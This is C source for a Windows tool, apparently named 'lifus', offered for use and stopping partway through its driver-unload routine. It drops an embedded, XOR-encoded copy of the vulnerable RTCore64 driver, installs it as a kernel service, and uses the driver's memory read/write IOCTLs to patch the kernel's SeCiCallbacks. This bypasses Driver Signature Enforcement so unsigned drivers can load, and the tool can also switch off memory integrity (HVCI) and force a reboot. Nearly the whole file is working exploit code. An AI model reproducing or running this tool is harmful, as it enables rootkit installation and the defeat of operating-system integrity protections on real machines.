#include <windows.h>
#include <winioctl.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <conio.h>
#include <stdint.h>
#include "rtcore64.h"
#define RTC_IOCTL_READ 0x80002048UL
#define RTC_IOCTL_WRITE 0x8000204CUL
#define SECI_CALLBACK_OFFSET 0x20ULL
#define DEFAULT_SECI_RVA 0xF04740ULL
#define DEFAULT_SAFE_RVA 0x69C1B0ULL
#define SYMBOL_SERVER_URL L"https://msdl.microsoft.com/download/symbols"
#define STATE_KEY_PATH L"Software\\lifus\\LatestState"
#define HVCI_KEY_PATH                                                                                        \
    L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"
#define VULN_SERVICE_NAME L"RTCore64"
#define VULN_DEVICE_PATH L"\\\\.\\RTCore64"
#define VULN_SERVICE_BINPATH L"System32\\drivers\\RTCore64.sys"
#define VULN_FILE_PATH L"%s\\System32\\drivers\\RTCore64.sys"
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004L
#define SYSTEM_MODULE_INFORMATION_CLASS 11
#pragma warning(disable : 4996)

typedef struct _RTC_PACKET {
    BYTE Pad0[8];
    ULONGLONG Address;
    BYTE Pad1[8];
    ULONG Size;
    ULONG Value;
    BYTE Pad3[16];
} RTC_PACKET;

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG NumberOfModules;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

typedef struct _LOADER_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} LOADER_UNICODE_STRING;

typedef LONG(NTAPI* pNtUnloadDriver)(LOADER_UNICODE_STRING*);

static const BYTE xor_key[7] = {0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C};

static void GetVulnFilePath(WCHAR* out, DWORD size) {
    WCHAR sysRoot[MAX_PATH];
    if (GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH) == 0 || wcslen(sysRoot) == 0)
        GetWindowsDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(out, size, VULN_FILE_PATH, sysRoot);
}

static BOOL ExtractDriver(void) {
    WCHAR path[MAX_PATH];
    GetVulnFilePath(path, MAX_PATH);
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    BYTE* buf = (BYTE*)malloc(sizeof(kRtCore64Enc));
    if (!buf) {
        CloseHandle(hFile);
        return FALSE;
    }
    for (UINT i = 0; i < sizeof(kRtCore64Enc); i++)
        buf[i] = kRtCore64Enc[i] ^ xor_key[i % sizeof(xor_key)];
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, buf, sizeof(kRtCore64Enc), &written, NULL) && written == sizeof(kRtCore64Enc);
    free(buf);
    CloseHandle(hFile);
    return ok;
}

static BOOL StopAndDeleteService(SC_HANDLE scm, const WCHAR* name) {
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
    if (!svc)
        return TRUE;
    BOOL ok = TRUE;
    SERVICE_STATUS st;
    if (QueryServiceStatus(svc, &st) && st.dwCurrentState != SERVICE_STOPPED &&
        st.dwCurrentState != SERVICE_STOP_PENDING) {
        if (!ControlService(svc, SERVICE_CONTROL_STOP, &st)) {
            ok = FALSE;
        } else {
            for (int i = 0; i < 100; i++) {
                if (!QueryServiceStatus(svc, &st))
                    break;
                if (st.dwCurrentState == SERVICE_STOPPED)
                    break;
                Sleep(100);
            }
            if (st.dwCurrentState != SERVICE_STOPPED)
                ok = FALSE;
        }
    }
    if (ok)
        DeleteService(svc);
    CloseServiceHandle(svc);
    return ok;
}

static BOOL ServiceIsRunning(SC_HANDLE scm, const WCHAR* name) {
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_QUERY_STATUS);
    if (!svc)
        return FALSE;
    SERVICE_STATUS st;
    BOOL running = QueryServiceStatus(svc, &st) && st.dwCurrentState == SERVICE_RUNNING;
    CloseServiceHandle(svc);
    return running;
}

static BOOL InstallVulnerableDriver(void) {
    if (!ExtractDriver()) {
        wprintf(L"[-] failed to write rtcore64.sys (error %lu)\n", GetLastError());
        return FALSE;
    }
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        wprintf(L"[-] openscmanager failed (error %lu)\n", GetLastError());
        return FALSE;
    }
    StopAndDeleteService(scm, VULN_SERVICE_NAME);
    SC_HANDLE svc =
        CreateServiceW(scm, VULN_SERVICE_NAME, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, VULN_SERVICE_BINPATH, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        wprintf(L"[-] createservice rtcore64 failed (error %lu)\n", GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            wprintf(L"[-] startservice rtcore64 failed (error %lu)\n", err);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return FALSE;
        }
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

static void RemoveVulnerableDriver(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        StopAndDeleteService(scm, VULN_SERVICE_NAME);
        CloseServiceHandle(scm);
    }
    WCHAR path[MAX_PATH];
    GetVulnFilePath(path, MAX_PATH);
    DeleteFileW(path);
}

static BOOL OpenRtcDevice(HANDLE* out) {
    for (int i = 0; i < 30; i++) {
        HANDLE h =
            CreateFileW(VULN_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            *out = h;
            return TRUE;
        }
        Sleep(100);
    }
    return FALSE;
}

static BOOL EnablePrivilege(const WCHAR* name);

typedef struct _KERNEL_MODULE {
    ULONGLONG Base;
    ULONG Size;
    WCHAR Name[64];
} KERNEL_MODULE;

static BOOL EnumKernelModules(KERNEL_MODULE* modules, ULONG maxCount, ULONG* countOut) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;
    pNtQuerySystemInformation query =
        (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!query)
        return FALSE;
    EnablePrivilege(L"SeDebugPrivilege");
    ULONG length = 0x100000;
    for (int attempt = 0; attempt < 6; attempt++) {
        PVOID buf = malloc(length);
        if (!buf)
            return FALSE;
        ULONG needed = 0;
        LONG st = query(SYSTEM_MODULE_INFORMATION_CLASS, buf, length, &needed);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            free(buf);
            length = needed + 0x10000;
            continue;
        }
        if (st != 0) {
            free(buf);
            return FALSE;
        }
        PSYSTEM_MODULE_INFORMATION info = (PSYSTEM_MODULE_INFORMATION)buf;
        ULONG count = info->NumberOfModules;
        if (count > maxCount)
            count = maxCount;
        for (ULONG i = 0; i < count; i++) {
            const char* name = (const char*)info->Modules[i].FullPathName + info->Modules[i].OffsetToFileName;
            modules[i].Base = (ULONGLONG)(ULONG_PTR)info->Modules[i].ImageBase;
            modules[i].Size = info->Modules[i].ImageSize;
            MultiByteToWideChar(CP_ACP, 0, name, -1, modules[i].Name, 64);
        }
        *countOut = count;
        free(buf);
        return TRUE;
    }
    return FALSE;
}

static BOOL GetNtoskrnlBase(ULONGLONG* baseOut, ULONG* sizeOut) {
    KERNEL_MODULE modules[512];
    for (int attempt = 0; attempt < 5; attempt++) {
        ULONG count = 0;
        if (!EnumKernelModules(modules, 512, &count))
            return FALSE;
        for (ULONG i = 0; i < count; i++) {
            if (_wcsicmp(modules[i].Name, L"ntoskrnl.exe") == 0) {
                if (modules[i].Base != 0) {
                    *baseOut = modules[i].Base;
                    *sizeOut = modules[i].Size;
                    return TRUE;
                }
                wprintf(L"[!] kernel reported ntoskrnl.exe with base 0x0 (attempt %d of 5), retrying\n",
                    attempt + 1);
                break;
            }
        }
        Sleep(2000);
    }
    return FALSE;
}

static const WCHAR* FindModuleForAddress(const KERNEL_MODULE* modules, ULONG count, ULONGLONG address) {
    for (ULONG i = 0; i < count; i++) {
        if (address >= modules[i].Base && address < modules[i].Base + modules[i].Size)
            return modules[i].Name;
    }
    return NULL;
}

static BOOL SafeRvaInText(ULONGLONG rva) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR path[MAX_PATH];
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(path, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return FALSE;
    }
    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }
    BOOL ok = FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (memcmp(sec[i].Name, ".text", 5) == 0) {
                    ULONGLONG va = sec[i].VirtualAddress;
                    ULONGLONG vs = sec[i].Misc.VirtualSize;
                    if (rva >= va && rva < va + vs)
                        ok = TRUE;
                    break;
                }
            }
        }
    }
    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

typedef struct _PDB_INFO {
    WCHAR Name[64];
    WCHAR Guid[64];
} PDB_INFO;

static BOOL GetPdbInfo(const WCHAR* pePath, PDB_INFO* info) {
    HANDLE hFile = CreateFileW(pePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return FALSE;
    }
    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }
    BOOL ok = FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            DWORD dirRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
            DWORD dirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
            if (dirRva && dirSize) {
                PIMAGE_DEBUG_DIRECTORY dir = (PIMAGE_DEBUG_DIRECTORY)((BYTE*)base + dirRva);
                for (DWORD i = 0; i < dirSize / sizeof(IMAGE_DEBUG_DIRECTORY); i++) {
                    if (dir[i].Type == IMAGE_DEBUG_TYPE_CODEVIEW) {
                        typedef struct _CV_PDB70 {
                            DWORD CvSig;
                            GUID Sig;
                            DWORD Age;
                            char FileName[1];
                        } CV_PDB70;

                        CV_PDB70* cv = (CV_PDB70*)((BYTE*)base + dir[i].AddressOfRawData);
                        if (cv->CvSig == 0x53445352) {
                            swprintf_s(info->Guid, 64, L"%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X%X",
                                cv->Sig.Data1, cv->Sig.Data2, cv->Sig.Data3, cv->Sig.Data4[0],
                                cv->Sig.Data4[1], cv->Sig.Data4[2], cv->Sig.Data4[3], cv->Sig.Data4[4],
                                cv->Sig.Data4[5], cv->Sig.Data4[6], cv->Sig.Data4[7], cv->Age);
                            if (MultiByteToWideChar(CP_UTF8, 0, cv->FileName, -1, info->Name, 64) == 0)
                                wcscpy_s(info->Name, 64, L"ntkrnlmp.pdb");
                            ok = TRUE;
                            break;
                        }
                    }
                }
            }
        }
    }
    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

static BOOL DownloadFile(const WCHAR* url, const WCHAR* outputPath) {
    URL_COMPONENTSW parts;
    WCHAR host[256];
    WCHAR path[2048];
    memset(&parts, 0, sizeof(parts));
    parts.dwStructSize = sizeof(parts);
    parts.lpszHostName = host;
    parts.dwHostNameLength = 256;
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(url, 0, 0, &parts))
        return FALSE;
    HINTERNET session = WinHttpOpen(
        L"loader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session)
        return FALSE;
    HINTERNET conn = WinHttpConnect(session, host, parts.nPort, 0);
    if (!conn) {
        WinHttpCloseHandle(session);
        return FALSE;
    }
    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, parts.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!req) {
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return FALSE;
    }
    BOOL ok = FALSE;
    if (WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(req, NULL)) {
        DWORD status = 0;
        DWORD statusSize = sizeof(status);
        WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize, WINHTTP_NO_HEADER_INDEX);
        if (status == 200) {
            HANDLE hFile =
                CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                BYTE buffer[8192];
                DWORD read = 0;
                DWORD written = 0;
                ok = TRUE;
                while (WinHttpReadData(req, buffer, sizeof(buffer), &read) && read > 0) {
                    if (!WriteFile(hFile, buffer, read, &written, NULL)) {
                        ok = FALSE;
                        break;
                    }
                }
                CloseHandle(hFile);
                if (!ok)
                    DeleteFileW(outputPath);
            }
        }
    }
    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return ok;
}

static BOOL EnsurePdbDownloaded(void) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR ntosPath[MAX_PATH];
    WCHAR progData[MAX_PATH];
    WCHAR cacheDir[MAX_PATH];
    WCHAR pdbDir[MAX_PATH];
    WCHAR pdbPath[MAX_PATH];
    WCHAR url[1024];
    PDB_INFO info;
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(ntosPath, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    if (!GetPdbInfo(ntosPath, &info))
        return FALSE;
    wprintf(L"[+] pdb %s (%s)\n", info.Name, info.Guid);
    if (GetEnvironmentVariableW(L"ProgramData", progData, MAX_PATH) == 0)
        wcscpy_s(progData, MAX_PATH, L"C:\\ProgramData");
    swprintf_s(cacheDir, MAX_PATH, L"%s\\dbg\\sym", progData);
    CreateDirectoryW(cacheDir, NULL);
    swprintf_s(pdbDir, MAX_PATH, L"%s\\%s\\%s", cacheDir, info.Name, info.Guid);
    CreateDirectoryW(pdbDir, NULL);
    swprintf_s(pdbPath, MAX_PATH, L"%s\\%s", pdbDir, info.Name);
    if (GetFileAttributesW(pdbPath) != INVALID_FILE_ATTRIBUTES)
        return TRUE;
    swprintf_s(url, 1024, L"%s/%s/%s/%s", SYMBOL_SERVER_URL, info.Name, info.Guid, info.Name);
    wprintf(L"[*] downloading pdb from microsoft symbol server\n");
    wprintf(L"[*] first run can take a while\n");
    if (!DownloadFile(url, pdbPath)) {
        wprintf(L"[-] pdb download failed\n");
        return FALSE;
    }
    wprintf(L"[+] pdb downloaded\n");
    return TRUE;
}

static BOOL LookupSymbol(DWORD64 baseAddr, const WCHAR* name, ULONGLONG* out) {
    BYTE buffer[sizeof(SYMBOL_INFOW) + MAX_SYM_NAME * sizeof(WCHAR)];
    PSYMBOL_INFOW sym = (PSYMBOL_INFOW)buffer;
    memset(buffer, 0, sizeof(buffer));
    sym->SizeOfStruct = sizeof(SYMBOL_INFOW);
    sym->MaxNameLen = MAX_SYM_NAME;
    WCHAR qualified[256];
    swprintf_s(qualified, 256, L"ntoskrnl.exe!%s", name);
    if (!SymFromNameW(GetCurrentProcess(), qualified, sym)) {
        memset(buffer, 0, sizeof(buffer));
        sym->SizeOfStruct = sizeof(SYMBOL_INFOW);
        sym->MaxNameLen = MAX_SYM_NAME;
        if (!SymFromNameW(GetCurrentProcess(), name, sym))
            return FALSE;
    }
    *out = sym->Address - baseAddr;
    return TRUE;
}

static BOOL ResolveOffsets(ULONGLONG* seciRva, ULONGLONG* safeRva) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR ntosPath[MAX_PATH];
    WCHAR progData[MAX_PATH];
    WCHAR cachePath[MAX_PATH];
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(ntosPath, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    if (GetEnvironmentVariableW(L"ProgramData", progData, MAX_PATH) == 0)
        wcscpy_s(progData, MAX_PATH, L"C:\\ProgramData");
    swprintf_s(cachePath, MAX_PATH, L"%s\\dbg\\sym", progData);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
    if (!SymInitializeW(GetCurrentProcess(), cachePath, FALSE))
        return FALSE;
    BOOL ok = FALSE;
    DWORD64 baseAddr = SymLoadModuleExW(GetCurrentProcess(), NULL, ntosPath, NULL, 0x10000000, 0, NULL, 0);
    if (baseAddr) {
        ULONGLONG seci = 0;
        ULONGLONG safe = 0;
        if (LookupSymbol(baseAddr, L"SeCiCallbacks", &seci) &&
            LookupSymbol(baseAddr, L"ZwFlushInstructionCache", &safe)) {
            *seciRva = seci;
            *safeRva = safe;
            ok = TRUE;
        }
        SymUnloadModule64(GetCurrentProcess(), baseAddr);
    }
    SymCleanup(GetCurrentProcess());
    return ok;
}

static BOOL ReadMem32(HANDLE h, ULONGLONG address, ULONG* value) {
    RTC_PACKET pkt;
    DWORD returned = 0;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address;
    pkt.Size = 4;
    if (!DeviceIoControl(h, RTC_IOCTL_READ, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    *value = pkt.Value;
    return TRUE;
}

static BOOL ReadMem64(HANDLE h, ULONGLONG address, ULONGLONG* value) {
    ULONG low, high;
    if (!ReadMem32(h, address, &low))
        return FALSE;
    if (!ReadMem32(h, address + 4, &high))
        return FALSE;
    *value = ((ULONGLONG)high << 32) | low;
    return TRUE;
}

static BOOL WriteMem64(HANDLE h, ULONGLONG address, ULONGLONG value) {
    RTC_PACKET pkt;
    DWORD returned = 0;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address;
    pkt.Size = 4;
    pkt.Value = (ULONG)(value & 0xFFFFFFFF);
    if (!DeviceIoControl(h, RTC_IOCTL_WRITE, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address + 4;
    pkt.Size = 4;
    pkt.Value = (ULONG)((value >> 32) & 0xFFFFFFFF);
    if (!DeviceIoControl(h, RTC_IOCTL_WRITE, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    return TRUE;
}

static BOOL SaveState(ULONGLONG callback) {
    HKEY key;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, STATE_KEY_PATH, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL) !=
        ERROR_SUCCESS)
        return FALSE;
    DWORD patched = 1;
    RegSetValueExW(key, L"IsPatched", 0, REG_DWORD, (const BYTE*)&patched, sizeof(patched));
    BOOL ok = RegSetValueExW(key, L"OriginalCallback", 0, REG_QWORD, (const BYTE*)&callback,
                  sizeof(callback)) == ERROR_SUCCESS;
    RegCloseKey(key);
    return ok;
}

static BOOL LoadState(ULONGLONG* callback) {
    HKEY key;
    DWORD size = sizeof(ULONGLONG);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, STATE_KEY_PATH, 0, KEY_READ, &key) != ERROR_SUCCESS)
        return FALSE;
    BOOL ok = RegQueryValueExW(key, L"OriginalCallback", NULL, NULL, (BYTE*)callback, &size) == ERROR_SUCCESS;
    RegCloseKey(key);
    return ok;
}

static void ClearState(void) {
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, STATE_KEY_PATH, 0, KEY_WRITE, &key) == ERROR_SUCCESS) {
        DWORD patched = 0;
        RegSetValueExW(key, L"IsPatched", 0, REG_DWORD, (const BYTE*)&patched, sizeof(patched));
        RegDeleteValueW(key, L"OriginalCallback");
        RegCloseKey(key);
    }
}

static BOOL HvciGuard(BOOL assumeYes) {
    HKEY key;
    DWORD enabled = 0;
    DWORD size = sizeof(enabled);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, HVCI_KEY_PATH, 0, KEY_READ | KEY_WRITE, &key) != ERROR_SUCCESS)
        return TRUE;
    if (RegQueryValueExW(key, L"Enabled", NULL, NULL, (BYTE*)&enabled, &size) != ERROR_SUCCESS ||
        enabled != 1) {
        RegCloseKey(key);
        return TRUE;
    }
    RegCloseKey(key);
    wprintf(L"[!] memory integrity (hvci) is enabled\n");
    wprintf(L"[!] loading unsigned drivers will crash the system\n");
    if (!assumeYes) {
        wprintf(L"[?] disable memory integrity and reboot now? (y/n): ");
        int c = _getwch();
        wprintf(L"\n");
        if (c == L'y' || c == L'Y') {
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, HVCI_KEY_PATH, 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
                enabled = 0;
                RegSetValueExW(key, L"Enabled", 0, REG_DWORD, (const BYTE*)&enabled, sizeof(enabled));
                RegCloseKey(key);
            }
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
                CloseHandle(hToken);
            }
            InitiateSystemShutdownExW(
                NULL, L"Memory Integrity disabled", 0, TRUE, TRUE, SHTDN_REASON_MAJOR_OTHER);
            ExitProcess(0);
        }
        if (c == L'n' || c == L'N')
            return FALSE;
    }
    wprintf(L"[!] continuing with hvci enabled at your own risk\n");
    return TRUE;
}

static BOOL NormalizeDriverPath(const WCHAR* input, WCHAR* out, DWORD outSize) {
    WCHAR buffer[MAX_PATH];
    if (wcschr(input, L'\\') || wcschr(input, L':')) {
        if (GetFullPathNameW(input, MAX_PATH, buffer, NULL) == 0)
            return FALSE;
    } else {
        WCHAR sysDir[MAX_PATH];
        GetSystemDirectoryW(sysDir, MAX_PATH);
        swprintf_s(buffer, MAX_PATH, L"%s\\drivers\\%s", sysDir, input);
    }
    size_t len = wcslen(buffer);
    if (len < 4 || _wcsicmp(buffer + len - 4, L".sys") != 0)
        wcscat_s(buffer, MAX_PATH, L".sys");
    wcscpy_s(out, outSize, buffer);
    return TRUE;
}

static BOOL StartTargetService(const WCHAR* path, DWORD* errOut) {
    WCHAR serviceName[MAX_PATH];
    const WCHAR* slash = wcsrchr(path, L'\\');
    wcscpy_s(serviceName, MAX_PATH, slash ? slash + 1 : path);
    size_t len = wcslen(serviceName);
    if (len >= 4 && _wcsicmp(serviceName + len - 4, L".sys") == 0)
        serviceName[len - 4] = 0;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        *errOut = GetLastError();
        return FALSE;
    }
    if (!StopAndDeleteService(scm, serviceName) && ServiceIsRunning(scm, serviceName)) {
        CloseServiceHandle(scm);
        *errOut = ERROR_SERVICE_ALREADY_RUNNING;
        return TRUE;
    }
    SC_HANDLE svc = CreateServiceW(scm, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS)
        svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
    if (!svc) {
        *errOut = GetLastError();
        CloseServiceHandle(scm);
        return FALSE;
    }
    BOOL ok = FALSE;
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING)
            ok = TRUE;
        else
            *errOut = err;
    } else {
        ok = TRUE;
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

static BOOL EnablePrivilege(const WCHAR* name) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &tkp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return ok;
}

static LONG UnloadDriverNative(const WCHAR* serviceName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return -1;
    pNtUnloadDriver unload = (pNtUnloadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
    if (!unload)
        return -1;
    WCHAR path[256];
    swprintf_s(path, 256, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", serviceName);
    LOADER_UNICODE_STRING us;
    us.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    us.MaximumLength = (USHORT)((wcslen(path) + 1) * sizeof(WCHAR));
    us.Buffer = path;
    return unload(&us);
}

static int CmdUnload(const WCHAR* serviceName) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        wprintf(L"[-] openscmanager failed (error %lu)\n", GetLastError());
        return 1;
    }
    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
    if (!svc) {
        wprintf(L"[-] service %s not found (error %lu)\n", serviceName, GetLastError());
        CloseServiceHandle(scm);
        return 1;
    }
    SERVICE_STATUS st;
    BOOL stopped = FALSE;
    if (QueryServiceStatus(svc, &st) && st.dwCurrentState == SERVICE_STOPPED) {
        wprintf(L"[+] service %s already stopped\n", serviceName);
        stopped = TRUE;
    } else if (ControlService(svc, SERVICE_CONTROL_STOP, &st)) {
        for (int i = 0; i < 100 && QueryServiceStatus(svc, &st) && st.dwCurrentState != SERVICE_STOPPED; i++)
            Sleep(100);
        if (st.dwCurrentState == SERVICE_STOPPED) {
            wprintf(L"[+] service %s stopped\n", serviceName);
            stopped = TRUE;
        } else {
            wprintf(L"[!] service %s did not reach stopped state\n", serviceName);
        }
    } else {
        wprintf(L"[!] scm stop refused (error %lu)\n", GetLastError());
    }
    if (!stopped) {
        if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
            wprintf(L"[-] cannot enable seloaddriverprivilege\n");
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return 1;
        }
        wprintf(L"[*] unloading driver via ntunloaddriver\n");
        LONG stNative = UnloadDriverNative(serviceName);
        if (stNative != 0) {
            wprintf(L"[-] ntunloaddriver failed (status 0x%08lX)\n", (ULONG)stNative);
            wprintf(L"[-] drivers loaded via dse bypass cannot be unloaded on this windows build\n");
            wprintf(L"[-] reboot the machine to unload the driver, then rebuild\n");
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return 1;
        }
        Sleep(500);
